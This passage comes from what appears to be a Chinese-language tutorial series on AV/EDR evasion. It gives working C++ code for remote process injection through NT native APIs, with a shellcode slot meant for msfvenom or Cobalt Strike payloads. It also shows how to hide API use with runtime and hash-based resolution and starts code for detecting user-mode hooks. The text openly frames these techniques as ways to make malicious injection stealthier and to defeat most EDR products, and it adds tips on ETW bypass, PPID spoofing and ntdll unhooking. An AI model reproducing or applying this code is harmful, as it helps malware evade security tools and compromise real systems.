<h3 id="第1步：定义NTAPI原型"><a href="#第1步：定义NTAPI原型" class="headerlink" title="第1步：定义NTAPI原型"></a><strong>第1步：定义NTAPI原型</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* pNtOpenProcess)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PHANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">    ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">    POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">    PCLIENT_ID ClientId</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* pNtAllocateVirtualMemory)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID* BaseAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">    PSIZE_T RegionSize,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG AllocationType,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG Protect</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* pNtWriteVirtualMemory)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID BaseAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID Buffer,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG BufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function">    PULONG NumberOfBytesWritten</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* pNtCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">    ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">    HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID StartRoutine,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID Argument,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG CreateFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">    SIZE_T ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">    SIZE_T StackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">    SIZE_T MaximumStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID AttributeList</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="第2步：运行时解析函数地址"><a href="#第2步：运行时解析函数地址" class="headerlink" title="第2步：运行时解析函数地址"></a><strong>第2步：运行时解析函数地址</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HMODULE hNtdll = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br>pNtOpenProcess NtOpenProcess = (pNtOpenProcess)<span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;NtOpenProcess&quot;</span>);<br>pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)<span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;NtAllocateVirtualMemory&quot;</span>);<br>pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)<span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;NtWriteVirtualMemory&quot;</span>);<br>pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)<span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;NtCreateThreadEx&quot;</span>);<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="第3步：定位目标进程（例如Notepad）"><a href="#第3步：定位目标进程（例如Notepad）" class="headerlink" title="第3步：定位目标进程（例如Notepad）"></a><strong>第3步：定位目标进程（例如Notepad）</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD pid = <span class="hljs-built_in">GetTargetPID</span>(<span class="hljs-string">&quot;notepad.exe&quot;</span>);<br>HANDLE hProcess;<br>CLIENT_ID clientId = &#123; (HANDLE)pid, <span class="hljs-number">0</span> &#125;;<br>OBJECT_ATTRIBUTES objAttr = &#123; <span class="hljs-built_in">sizeof</span>(OBJECT_ATTRIBUTES), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span> &#125;;<br><br>NTSTATUS status = <span class="hljs-built_in">NtOpenProcess</span>(&amp;hProcess, PROCESS_ALL_ACCESS, &amp;objAttr, &amp;clientId);<br><span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) &#123;<br>    std::cerr &lt;&lt; <span class="hljs-string">&quot;NtOpenProcess failed\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="第4步：分配内存并写入Shellcode"><a href="#第4步：分配内存并写入Shellcode" class="headerlink" title="第4步：分配内存并写入Shellcode"></a><strong>第4步：分配内存并写入Shellcode</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = &#123; <span class="hljs-comment">/* msfvenom 或 CobaltStrike Shellcode */</span> &#125;;<br><br>PVOID remoteAddr = <span class="hljs-literal">NULL</span>;<br>SIZE_T size = <span class="hljs-built_in">sizeof</span>(shellcode);<br><span class="hljs-built_in">NtAllocateVirtualMemory</span>(hProcess, &amp;remoteAddr, <span class="hljs-number">0</span>, &amp;size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-built_in">NtWriteVirtualMemory</span>(hProcess, remoteAddr, shellcode, <span class="hljs-built_in">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="第5步：使用-NtCreateThreadEx-创建线程"><a href="#第5步：使用-NtCreateThreadEx-创建线程" class="headerlink" title="第5步：使用 NtCreateThreadEx 创建线程"></a><strong>第5步：使用 <code>NtCreateThreadEx</code> 创建线程</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">NtCreateThreadEx</span>(&amp;hThread, THREAD_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hProcess, remoteAddr, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="为什么这个方法能够规避AV-EDR："><a href="#为什么这个方法能够规避AV-EDR：" class="headerlink" title="为什么这个方法能够规避AV&#x2F;EDR："></a><strong>为什么这个方法能够规避AV&#x2F;EDR：</strong></h3><ul>
<li><p><strong>不使用 <code>kernel32</code> API</strong>，如 <code>OpenProcess</code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code> 或 <code>CreateRemoteThread</code>，这些通常是EDR监控的目标。</p>
</li>
<li><p><strong>没有可见的可疑导入</strong>，静态分析中无法看到这些调用。</p>
</li>
<li><p><strong>系统调用路径保持本地</strong>，减少了API级的遥测。</p>
</li>
<li><p><strong>绕过了EDR在 <code>kernel32.dll</code> 中设置的API钩子</strong>，避免了被监控和记录。</p>
</li>
</ul>
<hr>
<h3 id="实际案例："><a href="#实际案例：" class="headerlink" title="实际案例："></a><strong>实际案例：</strong></h3><ul>
<li><p><strong>Cobalt Strike的 <code>beacon.dll</code></strong> 加载器使用此方法的变种进行注入。</p>
</li>
<li><p><strong>APT29恶意软件</strong> 直接使用 <code>NtWriteVirtualMemory</code> 和 <code>NtCreateThreadEx</code> 进行注入。</p>
</li>
<li><p><strong>现代加载器</strong> 使用加密的系统调用或直接的系统调用来混淆这些操作，避免被EDR捕捉。</p>
</li>
</ul>
<hr>
<h3 id="提升隐蔽性的增强技术："><a href="#提升隐蔽性的增强技术：" class="headerlink" title="提升隐蔽性的增强技术："></a><strong>提升隐蔽性的增强技术：</strong></h3><ul>
<li><p><strong>加密Shellcode，并在内存中解密</strong>，避免Shellcode被静态分析发现。</p>
</li>
<li><p><strong>使用 <code>NtCreateThreadEx</code> 中的属性列表伪装PPID</strong>，让目标进程看起来不像被注入的进程。</p>
</li>
<li><p><strong>直接使用系统调用</strong>，例如通过Hell’s Gate &#x2F; SysWhispers2等技术，进一步隐藏系统调用。</p>
</li>
<li><p><strong>注入前绕过ETW</strong>，避免ETW日志被触发。</p>
</li>
<li><p><strong>在执行注入逻辑前解除 <code>ntdll</code> 的钩子</strong>，确保系统调用不会被拦截。</p>
</li>
</ul>
<p>通过这些手段，可以在更高的隐蔽性和更低的风险下执行恶意注入，成功绕过多数EDR系统的检测。</p>
<h2 id="AV-EDR规避实战技术-3-7-IAT钩取与隐藏"><a href="#AV-EDR规避实战技术-3-7-IAT钩取与隐藏" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 3.7 - IAT钩取与隐藏"></a><strong>AV&#x2F;EDR规避实战技术 - 3.7 - IAT钩取与隐藏</strong></h2><h3 id="目标：-2"><a href="#目标：-2" class="headerlink" title="目标："></a><strong>目标：</strong></h3><p>理解恶意软件分析师和EDR如何通过检查导入地址表（IAT）来追踪执行，并学习如何动态解析或混淆API使用，从而防止静态和动态检测。</p>
<hr>
<h3 id="什么是IAT？"><a href="#什么是IAT？" class="headerlink" title="什么是IAT？"></a><strong>什么是IAT？</strong></h3><p><strong>导入地址表（IAT）</strong>是PE（便携式可执行文件）中的一个结构，存储了<strong>从DLL导入的函数指针</strong>。加载器在运行时会填充这个表格。</p>
<h3 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h3><p>如果您的恶意软件导入了<code>CreateFileA</code>，那么IAT中将包含指向该函数的指针，且该指针在运行时被解析。</p>
<p>EDR和静态分析器：</p>
<ul>
<li><p>解析IAT以查看您的二进制文件使用了哪些API。</p>
</li>
<li><p>基于此信息进行<strong>启发式分析</strong>和<strong>签名检测</strong>。</p>
</li>
<li><p>钩取IAT条目以拦截函数调用。</p>
</li>
</ul>
<hr>
<h3 id="基于IAT的EDR检测："><a href="#基于IAT的EDR检测：" class="headerlink" title="基于IAT的EDR检测："></a><strong>基于IAT的EDR检测：</strong></h3><ul>
<li><p><strong>静态检测</strong>：如果您的二进制文件导入了如<code>VirtualAllocEx</code>、<code>CreateRemoteThread</code>、<code>NtCreateThreadEx</code>等可疑API，这将成为一个警告信号。</p>
</li>
<li><p><strong>动态检测</strong>：IAT条目上设置的钩子可以实时记录和分析参数。</p>
</li>
</ul>
<hr>
<h3 id="规避策略：通过运行时API解析绕过IAT"><a href="#规避策略：通过运行时API解析绕过IAT" class="headerlink" title="规避策略：通过运行时API解析绕过IAT"></a><strong>规避策略：通过运行时API解析绕过IAT</strong></h3><h3 id="目标：避免在编译时将可疑API包含到IAT中。"><a href="#目标：避免在编译时将可疑API包含到IAT中。" class="headerlink" title="目标：避免在编译时将可疑API包含到IAT中。"></a><strong>目标</strong>：避免在编译时将可疑API包含到IAT中。</h3><p>相反，使用<code>LoadLibrary</code>和<code>GetProcAddress</code>动态解析这些API。</p>
<hr>
<h3 id="示例代码（C-）-动态API解析"><a href="#示例代码（C-）-动态API解析" class="headerlink" title="示例代码（C++） - 动态API解析"></a><strong>示例代码（C++） - 动态API解析</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 动态加载 kernel32.dll</span><br>    HMODULE hKernel32 = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hKernel32) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to load kernel32.dll&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 动态解析 VirtualAlloc</span><br>    FARPROC pVirtualAlloc = <span class="hljs-built_in">GetProcAddress</span>(hKernel32, <span class="hljs-string">&quot;VirtualAlloc&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!pVirtualAlloc) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to resolve VirtualAlloc&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 调用 VirtualAlloc，而不在IAT中显示</span><br>    <span class="hljs-type">void</span>* p = ((<span class="hljs-built_in">LPVOID</span>(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))pVirtualAlloc)(<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Allocated memory at: &quot;</span> &lt;&lt; p &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="为什么有效："><a href="#为什么有效：" class="headerlink" title="为什么有效："></a><strong>为什么有效：</strong></h3><ul>
<li><p><code>VirtualAlloc</code><strong>不出现在IAT中</strong></p>
</li>
<li><p>静态分析工具不会基于导入信息标记您的二进制文件</p>
</li>
<li><p>通过在运行时解析API，您绕过了<strong>IAT钩子</strong></p>
</li>
</ul>
<hr>
<h3 id="进一步的规避：基于哈希的API解析"><a href="#进一步的规避：基于哈希的API解析" class="headerlink" title="进一步的规避：基于哈希的API解析"></a><strong>进一步的规避：基于哈希的API解析</strong></h3><p>为了进一步绕过基于字符串的检测，您可以通过<strong>哈希API名称</strong>并手动解析它们。</p>
<hr>
<h3 id="基于哈希的示例："><a href="#基于哈希的示例：" class="headerlink" title="基于哈希的示例："></a><strong>基于哈希的示例：</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">DWORD <span class="hljs-title">hash</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* str)</span> </span>&#123;<br>    DWORD h = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (*str) &#123;<br>        h = ((h &lt;&lt; <span class="hljs-number">5</span>) + h) + *str++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后，通过哈希值匹配解析：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">FARPROC <span class="hljs-title">ResolveAPIByHash</span><span class="hljs-params">(HMODULE hMod, DWORD hashValue)</span> </span>&#123;<br>    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hMod;<br>    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dosHeader-&gt;e_lfanew);<br><br>    DWORD importDirRVA = ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + importDirRVA);<br><br>    DWORD* nameArray = (DWORD*)((BYTE*)hMod + exportDir-&gt;AddressOfNames);<br>    WORD* ordArray = (WORD*)((BYTE*)hMod + exportDir-&gt;AddressOfNameOrdinals);<br>    DWORD* funcArray = (DWORD*)((BYTE*)hMod + exportDir-&gt;AddressOfFunctions);<br><br>    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>* name = (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)hMod + nameArray[i];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">hash</span>(name) == hashValue) &#123;<br>            WORD ordinal = ordArray[i];<br>            <span class="hljs-keyword">return</span> (FARPROC)((BYTE*)hMod + funcArray[ordinal]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="为什么有效：-1"><a href="#为什么有效：-1" class="headerlink" title="为什么有效："></a><strong>为什么有效：</strong></h3><ul>
<li><p>AV&#x2F;EDR无法在内存中匹配诸如<code>VirtualAlloc</code>、<code>WriteProcessMemory</code>等字符串</p>
</li>
<li><p>恶意软件变得<strong>更加多态</strong></p>
</li>
<li><p>API名称可以被<strong>加密、哈希或混淆</strong></p>
</li>
</ul>
<hr>
<h3 id="高级：IAT混淆或清除"><a href="#高级：IAT混淆或清除" class="headerlink" title="高级：IAT混淆或清除"></a><strong>高级：IAT混淆或清除</strong></h3><p>您还可以通过修改或清除IAT来增强隐蔽性：</p>
<ul>
<li><p>用<code>0x00000000</code>或垃圾值覆盖函数指针</p>
</li>
<li><p>在运行时移除或加密导入节，解析所需的API后</p>
</li>
</ul>
<blockquote>
<p>这通常需要构建自定义的PE加载器或使用打包器。</p>
</blockquote>
<hr>
<h3 id="实际应用："><a href="#实际应用：" class="headerlink" title="实际应用："></a><strong>实际应用：</strong></h3><ul>
<li><p><strong>Cobalt Strike</strong>的Shellcode加载器通过手动解析<code>LoadLibraryA</code>和<code>GetProcAddress</code>来避免IAT</p>
</li>
<li><p><strong>Meterpreter</strong>和<strong>Empire代理</strong>通过动态解析API来避开静态检测</p>
</li>
<li><p><strong>FIN7恶意软件</strong>广泛使用IAT清除和API哈希以绕过沙箱检测</p>
</li>
</ul>
<hr>
<h3 id="结论："><a href="#结论：" class="headerlink" title="结论："></a><strong>结论：</strong></h3><ul>
<li><p>基于IAT的检测非常强大，但是可以规避的</p>
</li>
<li><p>避免静态导入是规避AV&#x2F;EDR的关键</p>
</li>
<li><p>动态解析和API哈希提供了强大的隐蔽性</p>
</li>
<li><p>结合<strong>内存解除钩取</strong>和<strong>系统调用</strong>，可以实现完全规避</p>
</li>
</ul>
<p>通过动态解析API和混淆技术，恶意软件可以显著降低被检测的风险，绕过传统的IAT检查机制，从而增强其在面对EDR和AV系统时的生存能力。</p>
<h2 id="AV-EDR规避实战技术-3-8-API钩取规避：用户态与内核级"><a href="#AV-EDR规避实战技术-3-8-API钩取规避：用户态与内核级" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 3.8 - API钩取规避：用户态与内核级"></a><strong>AV&#x2F;EDR规避实战技术 - 3.8 - API钩取规避：用户态与内核级</strong></h2><h3 id="概述：-1"><a href="#概述：-1" class="headerlink" title="概述："></a><strong>概述：</strong></h3><p>EDR通过在<strong>用户态</strong>和<strong>内核级</strong>实施<strong>API钩取</strong>来监控、修改或阻止可疑行为。这包括：</p>
<ul>
<li><p><strong>用户态钩取</strong>：通过DLL实现（例如，EDR注入到用户进程中）。</p>
</li>
<li><p><strong>内核级钩取</strong>：放置在SSDT（系统服务描述符表）、IRP处理程序或回调函数中。</p>
</li>
</ul>
<p>理解这些机制对于开发规避技术至关重要。</p>
<hr>
<h3 id="用户态钩取："><a href="#用户态钩取：" class="headerlink" title="用户态钩取："></a><strong>用户态钩取：</strong></h3><h3 id="定义：-4"><a href="#定义：-4" class="headerlink" title="定义："></a><strong>定义：</strong></h3><ul>
<li><p>EDR将DLL注入进程</p>
</li>
<li><p>覆盖函数的前几条指令（内联钩取）</p>
</li>
<li><p>钩取如<code>CreateRemoteThread</code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>等函数</p>
</li>
</ul>
<h3 id="钩取示例："><a href="#钩取示例：" class="headerlink" title="钩取示例："></a><strong>钩取示例：</strong></h3><p>内联钩取通过修改函数的前几条字节（通常是5个字节的JMP指令）来重定向执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">; 原始函数前言<br>mov edi, edi<br>push ebp<br>mov ebp, esp<br><br>; 钩取后的版本<br>jmp 0xDEADBEEF ; 跳转到EDR的日志代码<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="如何检测用户态钩取："><a href="#如何检测用户态钩取：" class="headerlink" title="如何检测用户态钩取："></a><strong>如何检测用户态钩取：</strong></h3><p>您可以比较内存中的函数指针和DLL中的磁盘版本。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsHooked</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* moduleName, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* functionName)</span> </span>&#123;<br>    HMODULE hModule = <span class="hljs-built_in">GetModuleHandleA</span>(moduleName);<br>    FARPROC inMem = <span class="hljs-built_in">GetProcAddress</span>(hModule, functionName);<br><br>    <span class="hljs-comment">// 从磁盘读取</span><br>    <span class="hljs-type">char</span> path[MAX_PATH];<br>    <span class="hljs-built_in">GetModuleFileNameA</span>(hModule, path, MAX_PATH);<br>    HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    HANDLE hMap = <span class="hljs-built_in">CreateFileMappingA</span>(hFile, <span class="hljs-literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    LPVOID lpBase = <span class="hljs-built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)lpBase;<br>    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)lpBase + dos-&gt;e_lfanew);<br><br>    DWORD rva = (DWORD)((BYTE*)inMem - (BYTE*)hModule);<br>    DWORD fileOffset = <span class="hljs-number">0</span>;<br><br>    PIMAGE_SECTION_HEADER section = <span class="hljs-built_in">IMAGE_FIRST_SECTION</span>(nt);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (rva &gt;= section[i].VirtualAddress &amp;&amp;<br>            rva &lt; section[i].VirtualAddress + section[i].SizeOfRawData) &#123;<br>            fileOffset = rva - section[i].VirtualAddress + section[i].PointerToRawData;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    BYTE memBytes[<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-built_in">memcpy</span>(memBytes, inMem, <span class="hljs-built_in">sizeof</span>(memBytes));<br><br>    BYTE diskBytes[<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-built_in">memcpy</span>(diskBytes, (BYTE*)lpBase + fileOffset, <span class="hljs-built_in">sizeof</span>(diskBytes));<br><br>    <span class="hljs-type">bool</span> hooked = <span class="hljs-built_in">memcmp</span>(memBytes, diskBytes, <span class="hljs-built_in">sizeof</span>(memBytes)) != <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">CloseHandle</span>(hMap);<br>    <span class="hljs-built_in">CloseHandle</span>(hFile);<br>    <span class="hljs-keyword">return</span> hooked;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsHooked</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;VirtualAlloc&quot;</span>)) &#123;<br>        std::cout &lt;&lt; <span 